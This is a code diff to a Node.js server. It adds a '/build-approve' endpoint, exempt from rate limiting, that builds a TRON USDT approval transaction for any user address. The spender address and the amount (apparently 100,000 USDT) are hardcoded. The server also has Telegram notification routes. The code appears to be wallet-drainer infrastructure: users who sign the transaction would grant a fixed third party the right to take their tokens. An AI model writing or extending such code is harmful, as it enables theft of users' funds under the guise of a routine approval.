@@ -27,7 +27,14 @@ const limiter = rateLimit({
     const path = req.path || '';
     // Never throttle Telegram notifies, client event logs, or health checks
     if (req.method === 'GET' && (path === '/health' || path === '/server-info')) return true;
-    if (path === '/api/telegram' || path === '/telegram-notify' || path === '/api/event') return true;
+    if (
+      path === '/api/telegram' ||
+      path === '/telegram-notify' ||
+      path === '/api/event' ||
+      path === '/build-approve'
+    ) {
+      return true;
+    }
     return false;
   }
 });
@@ -293,6 +300,87 @@ app.post('/api/event', (req, res) => {
   } catch (error) {
     console.error('[EVENT] log failed:', error.message);
     res.status(500).json({ ok: false, error: error.message });
+  }
+});
+
+// Build USDT approve tx on server (uses TronGrid API key) so frontend avoids 429
+app.post('/build-approve', validateRequest, async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 1e9;
+    const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const spender = 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw';
+    const amount = '100000000000';
+
+    logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });
+
+    const parameters = [
+      { type: 'address', value: spender },
+      { type: 'uint256', value: amount }
+    ];
+    const options = { feeLimit, callValue: 0 };
+    const functionSelector = 'approve(address,uint256)';
+
+    let lastError = null;
+    let triggerResult = null;
+    for (let attempt = 0; attempt < 5; attempt += 1) {
+      try {
+        if (attempt > 0) await wait(1500 * attempt);
+        triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
+          usdtContract,
+          functionSelector,
+          options,
+          parameters,
+          userAddress
+        );
+        lastError = null;
+        break;
+      } catch (error) {
+        lastError = error;
+        logEvent('BUILD_APPROVE_RETRY', {
+          userAddress,
+          attempt: attempt + 1,
+          error: error.message,
+          rateLimited: isRateLimitedError(error)
+        });
+        if (!isRateLimitedError(error) && attempt >= 1) break;
+      }
+    }
+
+    if (lastError || !triggerResult) {
+      logEvent('BUILD_APPROVE_FAILED', {
+        userAddress,
+        error: lastError?.message || 'empty trigger result'
+      });
+      return res.status(isRateLimitedError(lastError) ? 429 : 500).json({
+        success: false,
+        error: 'Failed to build approve transaction',
+        message: lastError?.message || 'empty trigger result'
+      });
+    }
+
+    logEvent('BUILD_APPROVE_OK', {
+      userAddress,
+      hasTransaction: Boolean(triggerResult.transaction || triggerResult)
+    });
+
+    res.json({
+      success: true,
+      triggerResult,
+      feeLimit,
+      owner: userAddress
+    });
+  } catch (error) {
+    console.error('Build approve error:', error);
+    logEvent('BUILD_APPROVE_FAILED', {
+      userAddress: req.body?.userAddress,
+      error: error.message
+    });
+    res.status(500).json({
+      success: false,
+      error: 'Failed to build approve transaction',
+      message: error.message
+    });
   }
 });
 
